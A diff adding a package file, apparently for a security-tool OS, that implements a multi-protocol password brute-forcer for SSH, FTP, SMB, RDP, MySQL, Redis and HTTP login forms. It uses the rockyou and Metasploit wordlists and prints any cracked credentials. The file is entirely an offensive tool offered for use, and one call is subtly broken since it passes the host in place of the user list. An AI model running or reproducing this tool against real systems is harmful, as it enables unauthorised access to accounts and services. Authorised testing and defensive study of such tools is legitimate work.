@@ -1,0 +1,64 @@
+## koppa package: koppa-bruteforce
+## version: 2.0.0
+## description: Multi-protocol brute forcer — SSH, FTP, HTTP, SMB, RDP, MySQL, Redis
+## author: KOPPA-OS
+## tags: bruteforce, credential, password, auth
+
+import net, log, sys
+
+let DEFAULT_WL_USER = "/usr/share/wordlists/metasploit/unix_users.txt"
+let DEFAULT_WL_PASS = "/usr/share/wordlists/rockyou.txt"
+let DEFAULT_THREADS = 10
+
+fn brute(proto, host, port, users, passwords, threads) {
+    log.info("[*] Brute-force " + proto + "://" + host + ":" + port)
+    let user_list = sys.read_lines(users or DEFAULT_WL_USER)
+    let pass_list = sys.read_lines(passwords or DEFAULT_WL_PASS)
+    let found = []
+
+    let results = net.brute_force(proto, host, port, user_list, pass_list, threads or DEFAULT_THREADS)
+    for r in results {
+        log.ok("[+] " + r.user + ":" + r.pass)
+        found.push(r)
+    }
+    if found.len() == 0 { log.err("[-] No valid credentials found") }
+    return found
+}
+
+fn ssh(host, users, passwords)   { brute("ssh",   host, 22,   users, passwords, DEFAULT_THREADS) }
+fn ftp(host, users, passwords)   { brute("ftp",   host, 21,   users, passwords, DEFAULT_THREADS) }
+fn smb(host, users, passwords)   { brute("smb",   host, 445,  users, passwords, DEFAULT_THREADS) }
+fn rdp(host, users, passwords)   { brute("rdp",   host, 3389, users, passwords, 4) }
+fn mysql(host, users, passwords) { brute("mysql", host, 3306, users, passwords, DEFAULT_THREADS) }
+fn redis(host, passwords)        { brute("redis", host, 6379, [""], passwords, DEFAULT_THREADS) }
+
+fn http_form(url, user_field, pass_field, users, passwords, fail_str) {
+    log.info("[*] HTTP form brute: " + url)
+    let user_list = sys.read_lines(users or DEFAULT_WL_USER)
+    let pass_list = sys.read_lines(passwords or DEFAULT_WL_PASS)
+    let found = net.http_brute(url, user_field, pass_field, user_list, pass_list, fail_str)
+    for r in found {
+        log.ok("[+] " + r.user + ":" + r.pass)
+    }
+    return found
+}
+
+fn main(args) {
+    log.info("[koppa-bruteforce] Multi-Protocol Brute Forcer v2.0")
+    let proto = args[0] or sys.prompt("Protocol (ssh|ftp|smb|rdp|mysql|redis|http): ")
+    let host  = args[1] or sys.prompt("Host: ")
+
+    if proto == "ssh"   { ssh(host, args[2], args[3]) }
+    if proto == "ftp"   { ftp(host, args[2], args[3]) }
+    if proto == "smb"   { smb(host, args[2], args[3]) }
+    if proto == "rdp"   { rdp(host, args[2], args[3]) }
+    if proto == "mysql" { mysql(host, args[2], args[3]) }
+    if proto == "redis" { redis(host, args[2]) }
+    if proto == "http" {
+        let url   = args[2] or sys.prompt("URL: ")
+        let uf    = args[3] or sys.prompt("User field: ")
+        let pf    = args[4] or sys.prompt("Pass field: ")
+        let fails = args[5] or sys.prompt("Fail string: ")
+        http_form(url, uf, pf, host, args[6], fails)
+    }
+}
